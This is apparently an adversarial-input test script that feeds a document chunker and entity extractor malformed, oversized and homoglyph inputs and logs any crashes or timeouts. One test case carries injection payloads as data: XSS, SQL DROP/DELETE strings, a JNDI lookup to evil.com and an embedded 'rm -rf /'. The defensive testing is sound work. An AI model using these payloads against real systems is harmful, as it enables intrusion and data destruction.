#!/usr/bin/env python3
"""
ADVERSARIAL INPUT ATTACK TEST

This test specifically targets the system with malformed, corrupted, and edge case inputs:
1. Extremely large documents (memory bombs)
2. Corrupted text with invalid characters
3. Documents with no extractable entities
4. Circular references and infinite loops
5. Malicious patterns designed to break parsers
6. Edge cases in entity recognition
7. Empty, null, and boundary condition inputs

The goal is to find input validation weaknesses and parsing vulnerabilities.
"""

import asyncio
import json
import time
import uuid
import random
import string
from datetime import datetime
from typing import Dict, List, Any, Optional
import logging

class AdversarialInputTest:
    """Test system with adversarial inputs designed to break processing"""
    
    def __init__(self):
        self.test_id = f"adversarial_{uuid.uuid4().hex[:8]}"
        self.attack_vectors = []
        self.system_vulnerabilities = []
        self.parsing_failures = []
        
        print(f"⚔️  ADVERSARIAL INPUT ATTACK TEST INITIALIZED")
        print(f"   Goal: Break system with malformed and edge case inputs")
        print(f"   Expected: Parser crashes, infinite loops, memory exhaustion")
    
    async def execute_adversarial_attack_suite(self) -> Dict[str, Any]:
        """Execute comprehensive adversarial input attacks"""
        
        print(f"\n🚨 ADVERSARIAL ATTACK SUITE")
        print(f"   Testing system robustness against malicious inputs")
        print(f"   Attack vectors: Large payloads, corrupted text, edge cases")
        
        attack_results = {
            "test_id": self.test_id,
            "start_time": datetime.now().isoformat(),
            "attacks_executed": 0,
            "system_crashes": 0,
            "parsing_failures": 0,
            "memory_exhaustions": 0,
            "infinite_loops": 0,
            "successful_defenses": 0,
            "vulnerabilities_found": [],
            "attack_details": []
        }
        
        # Generate adversarial test cases
        adversarial_inputs = self._generate_adversarial_inputs()
        
        print(f"📋 Generated {len(adversarial_inputs)} adversarial test cases")
        
        try:
            # Import tools
            import sys
            sys.path.append("/home/brian/projects/Digimons")
            
            from src.tools.phase1.t15a_text_chunker_unified import T15ATextChunkerUnified
            from src.tools.phase1.t23a_spacy_ner_unified import T23ASpacyNERUnified
            from src.tools.phase1.t27_relationship_extractor_unified import T27RelationshipExtractorUnified
            from src.core.service_manager import get_service_manager
            from src.tools.base_tool import ToolRequest
            
            service_manager = get_service_manager()
            
            # Initialize tools
            text_chunker = T15ATextChunkerUnified(service_manager)
            entity_extractor = T23ASpacyNERUnified(service_manager)
            relationship_extractor = T27RelationshipExtractorUnified(service_manager)
            
            print(f"✅ Tools initialized for adversarial testing")
            
            # Execute each attack vector
            for i, attack_input in enumerate(adversarial_inputs):
                print(f"\n⚔️ Attack {i+1}/{len(adversarial_inputs)}: {attack_input['attack_type']}")
                
                attack_result = await self._execute_single_adversarial_attack(
                    attack_input, 
                    {"chunker": text_chunker, "ner": entity_extractor, "relations": relationship_extractor},
                    attack_results
                )
                
                attack_results["attack_details"].append(attack_result)
                attack_results["attacks_executed"] += 1
                
                # Brief pause to prevent system overload
                await asyncio.sleep(0.2)
            
        except Exception as e:
            print(f"💥 ADVERSARIAL TEST FRAMEWORK FAILURE: {e}")
            attack_results["vulnerabilities_found"].append({
                "type": "FRAMEWORK_CRASH",
                "description": "Test framework itself crashed",
                "error": str(e)
            })
        
        attack_results["end_time"] = datetime.now().isoformat()
        
        # Analyze attack results
        self._analyze_adversarial_results(attack_results)
        
        return attack_results
    
    def _generate_adversarial_inputs(self) -> List[Dict[str, Any]]:
        """Generate comprehensive adversarial input test cases"""
        
        adversarial_cases = []
        
        # Attack 1: Memory Bomb - Extremely Large Document
        large_text = "This is a memory bomb document. " * 10000  # ~300KB of repeated text
        adversarial_cases.append({
            "attack_type": "MEMORY_BOMB",
            "description": "Extremely large document to exhaust memory",
            "content": large_text,
            "expected_failure": "OutOfMemoryError or processing timeout",
            "severity": "HIGH"
        })
        
        # Attack 2: Unicode Corruption - Invalid Characters
        corrupted_text = "Invalid unicode: \x00\x01\x02\x03\x04\x05 mixed with normal text Apple Inc. CEO Tim Cook \xff\xfe\xfd"
        adversarial_cases.append({
            "attack_type": "UNICODE_CORRUPTION",
            "description": "Text with invalid unicode characters",
            "content": corrupted_text,
            "expected_failure": "UnicodeDecodeError or character parsing failure",
            "severity": "MEDIUM"
        })
        
        # Attack 3: Empty and Null Inputs
        adversarial_cases.extend([
            {
                "attack_type": "EMPTY_INPUT",
                "description": "Completely empty document",
                "content": "",
                "expected_failure": "Input validation failure",
                "severity": "LOW"
            },
            {
                "attack_type": "WHITESPACE_ONLY",
                "description": "Document with only whitespace",
                "content": "   \n\n\t\t   \n   ",
                "expected_failure": "No entities found or processing error",
                "severity": "LOW"
            },
            {
                "attack_type": "NULL_BYTES",
                "description": "Document with null bytes",
                "content": "Normal text\x00with\x00null\x00bytes\x00scattered\x00throughout",
                "expected_failure": "String processing failure",
                "severity": "MEDIUM"
            }
        ])
        
        # Attack 4: Parsing Confusion - Ambiguous Structures
        parsing_confusion = """
        Dr. Dr. Dr. Smith Smith Smith from Smith & Smith & Smith Inc. Inc. Inc.
        met with CEO CEO CEO of Corp Corp Corp at Location Location Location.
        The The The meeting meeting meeting was was was about about about 
        partnership partnership partnership between between between company company company
        and and and company company company.
        """
        adversarial_cases.append({
            "attack_type": "PARSING_CONFUSION",
            "description": "Repeated words and structures to confuse parsers",
            "content": parsing_confusion,
            "expected_failure": "Infinite loops or parsing errors",
            "severity": "HIGH"
        })
        
        # Attack 5: Entity Overload - Maximum Entity Density
        entity_overload = ""
        names = ["John", "Jane", "Bob", "Alice", "Tom", "Mary", "David", "Sarah"]
        companies = ["Corp", "Inc", "LLC", "Ltd", "Co", "Group", "Systems", "Tech"]
        
        for i in range(100):  # Create 100 dense sentences
            name1 = random.choice(names)
            name2 = random.choice(names)
            comp1 = random.choice(companies)
            comp2 = random.choice(companies)
            entity_overload += f"Dr. {name1} from {comp1} {comp2} met CEO {name2} at {comp1}. "
        
        adversarial_cases.append({
            "attack_type": "ENTITY_OVERLOAD",
            "description": "Maximum density of entities to overload extraction",
            "content": entity_overload,
            "expected_failure": "Memory exhaustion or processing timeout",
            "severity": "HIGH"
        })
        
        # Attack 6: Special Characters and Injection Patterns
        special_chars = """
        Company name: <script>alert('xss')</script> Inc.
        CEO: Robert'); DROP TABLE entities;-- 
        Location: ${jndi:ldap://evil.com/a}
        Email: user@domain.com';DELETE FROM relationships WHERE 1=1;--
        Description: \"; rm -rf /; echo \"hacked
        """
        adversarial_cases.append({
            "attack_type": "INJECTION_PATTERNS",
            "description": "Special characters and injection patterns",
            "content": special_chars,
            "expected_failure": "Injection vulnerability or parsing error",
            "severity": "CRITICAL"
        })
        
        # Attack 7: Circular References
        circular_text = """
        Company A owns Company B. Company B owns Company C. Company C owns Company A.
        Person X works for Company A. Person Y works for Company B. Person Z works for Company C.
        Person X reports to Person Y. Person Y reports to Person Z. Person Z reports to Person X.
        Company A is located in City A. City A is part of Region A. Region A contains City A.
        """
        adversarial_cases.append({
            "attack_type": "CIRCULAR_REFERENCES",
            "description": "Circular relationships that could cause infinite loops",
            "content": circular_text,
            "expected_failure": "Infinite loop in relationship processing",
            "severity": "HIGH"
        })
        
        # Attack 8: Encoding Attacks
        encoding_attack = """
        Company: Αpple Inc. (Greek Alpha that looks like A)
        CEO: Τim Cook (Greek Tau that looks like T)  
        Location: Νew York (Greek Nu that looks like N)
        Product: iΡhone (Greek Rho that looks like P)
        """
        adversarial_cases.append({
            "attack_type": "ENCODING_ATTACK",
            "description": "Unicode lookalike characters to confuse entity matching",
            "content": encoding_attack,
            "expected_failure": "Entity misidentification or encoding errors",
            "severity": "MEDIUM"
        })
        
        # Attack 9: Boundary Conditions
        boundary_cases = [
            {
                "attack_type": "SINGLE_CHARACTER",
                "description": "Single character document",
                "content": "A",
                "expected_failure": "Minimum length validation failure",
                "severity": "LOW"
            },
            {
                "attack_type": "MAXIMUM_LINE_LENGTH",
                "description": "Single extremely long line",
                "content": "A" * 50000,  # 50K character line
                "expected_failure": "Line length buffer overflow",
                "severity": "MEDIUM"
            },
            {
                "attack_type": "NESTED_QUOTES",
                "description": "Deeply nested quotation marks",
                "content": '"' * 1000 + 'Apple Inc.' + '"' * 1000,
                "expected_failure": "Quote parsing overflow",
                "severity": "LOW"
            }
        ]
        adversarial_cases.extend(boundary_cases)
        
        # Attack 10: Resource Exhaustion Pattern
        resource_exhaustion = """
        """ + "Apple Inc. " * 1000 + """
        """ + "Microsoft Corporation " * 1000 + """
        """ + "Google LLC " * 1000 + """
        """ + "Amazon Web Services " * 1000 + """
        """ + "Meta Platforms Inc. " * 1000
        
        adversarial_cases.append({
            "attack_type": "RESOURCE_EXHAUSTION",
            "description": "Repetitive content to exhaust processing resources",
            "content": resource_exhaustion,
            "expected_failure": "CPU exhaustion or memory overflow",
            "severity": "HIGH"
        })
        
        return adversarial_cases
    
    async def _execute_single_adversarial_attack(self, attack_input: Dict[str, Any], 
                                               tools: Dict, results: Dict) -> Dict[str, Any]:
        """Execute a single adversarial attack and analyze results"""
        
        attack_start_time = time.time()
        attack_type = attack_input["attack_type"]
        
        attack_result = {
            "attack_type": attack_type,
            "severity": attack_input["severity"],
            "start_time": datetime.now().isoformat(),
            "execution_time": 0.0,
            "status": "unknown",
            "vulnerabilities": [],
            "defenses_triggered": [],
            "error_messages": []
        }
        
        try:
            print(f"   Executing {attack_type} attack...")
            
            # Step 1: Test Text Chunking with adversarial input
            chunk_request = ToolRequest(
                tool_id="T15A",
                operation="chunk_text",
                input_data={
                    "document_ref": f"storage://adversarial/{attack_type.lower()}.txt",
                    "text": attack_input["content"],
                    "confidence": 0.9
                },
                parameters={}
            )
            
            try:
                # Set timeout to detect infinite loops
                chunk_result = await asyncio.wait_for(
                    asyncio.to_thread(tools["chunker"].execute, chunk_request),
                    timeout=10.0  # 10 second timeout
                )
                
                if chunk_result.status == "success":
                    chunks = chunk_result.data.get("chunks", [])
                    attack_result["chunking_result"] = {
                        "status": "success",
                        "chunks_created": len(chunks)
                    }
                    
                    if len(chunks) > 100:
                        attack_result["vulnerabilities"].append({
                            "type": "EXCESSIVE_CHUNKING",
                            "description": f"Created {len(chunks)} chunks - potential memory issue"
                        })
                else:
                    attack_result["chunking_result"] = {
                        "status": "failed",
                        "error": chunk_result.error_message
                    }
                    attack_result["defenses_triggered"].append("chunking_input_validation")
                
            except asyncio.TimeoutError:
                attack_result["chunking_result"] = {"status": "timeout"}
                attack_result["vulnerabilities"].append({
                    "type": "INFINITE_LOOP_CHUNKING",
                    "description": "Chunking timed out - possible infinite loop"
                })
                results["infinite_loops"] += 1
                chunks = []  # No chunks to process further
                
            except Exception as e:
                attack_result["chunking_result"] = {"status": "crashed", "error": str(e)}
                attack_result["vulnerabilities"].append({
                    "type": "CHUNKING_CRASH",
                    "description": f"Chunking crashed: {str(e)}"
                })
                results["system_crashes"] += 1
                chunks = []
            
            # Step 2: Test Entity Extraction (if chunking succeeded)
            if attack_result.get("chunking_result", {}).get("status") == "success":
                chunks = chunk_result.data.get("chunks", [])
                
                # Test with first chunk only to prevent explosion
                if chunks:
                    entity_request = ToolRequest(
                        tool_id="T23A",
                        operation="extract_entities",
                        input_data={
                            "chunk_ref": chunks[0]["chunk_ref"],
                            "text": chunks[0]["text"],
                            "chunk_confidence": 0.9
                        },
                        parameters={"confidence_threshold": 0.1}
                    )
                    
                    try:
                        entity_result = await asyncio.wait_for(
                            asyncio.to_thread(tools["ner"].execute, entity_request),
                            timeout=15.0  # 15 second timeout for NER
                        )
                        
                        if entity_result.status == "success":
                            entities = entity_result.data.get("entities", [])
                            attack_result["entity_extraction_result"] = {
                                "status": "success",
                                "entities_found": len(entities)
                            }
                            
                            if len(entities) > 200:
                                attack_result["vulnerabilities"].append({
                                    "type": "ENTITY_EXPLOSION",
                                    "description": f"Extracted {len(entities)} entities - memory concern"
                                })
                        else:
                            attack_result["entity_extraction_result"] = {
                                "status": "failed",
                                "error": entity_result.error_message
                            }
                            attack_result["defenses_triggered"].append("entity_extraction_validation")
                    
                    except asyncio.TimeoutError:
                        attack_result["entity_extraction_result"] = {"status": "timeout"}
                        attack_result["vulnerabilities"].append({
                            "type": "INFINITE_LOOP_NER",
                            "description": "Entity extraction timed out"
                        })
                        results["infinite_loops"] += 1
                    
                    except Exception as e:
                        attack_result["entity_extraction_result"] = {"status": "crashed", "error": str(e)}
                        attack_result["vulnerabilities"].append({
                            "type": "NER_CRASH", 
                            "description": f"Entity extraction crashed: {str(e)}"
                        })
                        results["system_crashes"] += 1
            
            # Determine overall attack result
            if attack_result["vulnerabilities"]:
                attack_result["status"] = "vulnerability_found"
                results["vulnerabilities_found"].extend(attack_result["vulnerabilities"])
            elif attack_result["defenses_triggered"]:
                attack_result["status"] = "defense_successful"
                results["successful_defenses"] += 1
            else:
                attack_result["status"] = "no_effect"
                results["successful_defenses"] += 1
            
            print(f"     Result: {attack_result['status']}")
            if attack_result["vulnerabilities"]:
                print(f"     Vulnerabilities: {len(attack_result['vulnerabilities'])}")
            
        except Exception as e:
            attack_result["status"] = "test_framework_error"
            attack_result["error_messages"].append(str(e))
            print(f"     ⚠️ Test framework error: {e}")
        
        attack_result["execution_time"] = time.time() - attack_start_time
        attack_result["end_time"] = datetime.now().isoformat()
        
        return attack_result
    
    def _analyze_adversarial_results(self, results: Dict[str, Any]):
        """Analyze adversarial attack results"""
        
        print(f"\n📊 ADVERSARIAL ATTACK ANALYSIS:")
        
        attacks_executed = results["attacks_executed"]
        vulnerabilities_found = len(results["vulnerabilities_found"])
        successful_defenses = results["successful_defenses"]
        
        print(f"   ⚔️ Attacks Executed: {attacks_executed}")
        print(f"   🛡️ Successful Defenses: {successful_defenses}")
        print(f"   🚨 Vulnerabilities Found: {vulnerabilities_found}")
        print(f"   💥 System Crashes: {results['system_crashes']}")
        print(f"   🔄 Infinite Loops: {results['infinite_loops']}")
        print(f"   🧠 Memory Exhaustions: {results['memory_exhaustions']}")
        
        if vulnerabilities_found > 0:
            print(f"\n🚨 VULNERABILITIES DISCOVERED:")
            
            # Group vulnerabilities by type
            vuln_types = {}
            for vuln in results["vulnerabilities_found"]:
                vuln_type = vuln["type"]
                vuln_types[vuln_type] = vuln_types.get(vuln_type, 0) + 1
            
            for vuln_type, count in vuln_types.items():
                print(f"     {vuln_type}: {count} instances")
        
        # Calculate security score
        if attacks_executed > 0:
            security_score = (successful_defenses / attacks_executed) * 100
            print(f"\n🛡️ SECURITY SCORE: {security_score:.1f}%")
            
            if security_score < 70:
                print(f"   🚨 SECURITY CONCERN: Low defense success rate")
            elif security_score < 90:
                print(f"   ⚠️ MODERATE SECURITY: Some vulnerabilities found")
            else:
                print(f"   ✅ GOOD SECURITY: System handled most attacks well")
        
        # Provide security recommendations
        print(f"\n🔒 SECURITY RECOMMENDATIONS:")
        if results["system_crashes"] > 0:
            print(f"   • Add input validation to prevent system crashes")
        if results["infinite_loops"] > 0:
            print(f"   • Implement processing timeouts to prevent infinite loops")
        if results["memory_exhaustions"] > 0:
            print(f"   • Add memory limits and resource constraints")
        if vulnerabilities_found > 0:
            print(f"   • Review and fix identified vulnerabilities")
        else:
            print(f"   • System shows good resilience to adversarial inputs")

async def run_adversarial_input_test():
    """Execute the adversarial input test suite"""
    
    test = AdversarialInputTest()
    
    print(f"\n🚨 EXECUTING ADVERSARIAL INPUT TEST SUITE")
    print(f"   Testing system robustness against malicious inputs")
    print(f"   Expected: Parser vulnerabilities, injection attempts, edge cases")
    
    try:
        results = await test.execute_adversarial_attack_suite()
        
        # Save results
        results_file = f"adversarial_results_{test.test_id}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        
        with open(results_file, 'w') as f:
            json.dump(results, f, indent=2, default=str)
        
        print(f"\n📄 RESULTS SAVED: {results_file}")
        
        return results
        
    except Exception as e:
        print(f"💥 ADVERSARIAL TEST FRAMEWORK FAILURE: {e}")
        import traceback
        traceback.print_exc()

if __name__ == "__main__":
    asyncio.run(run_adversarial_input_test())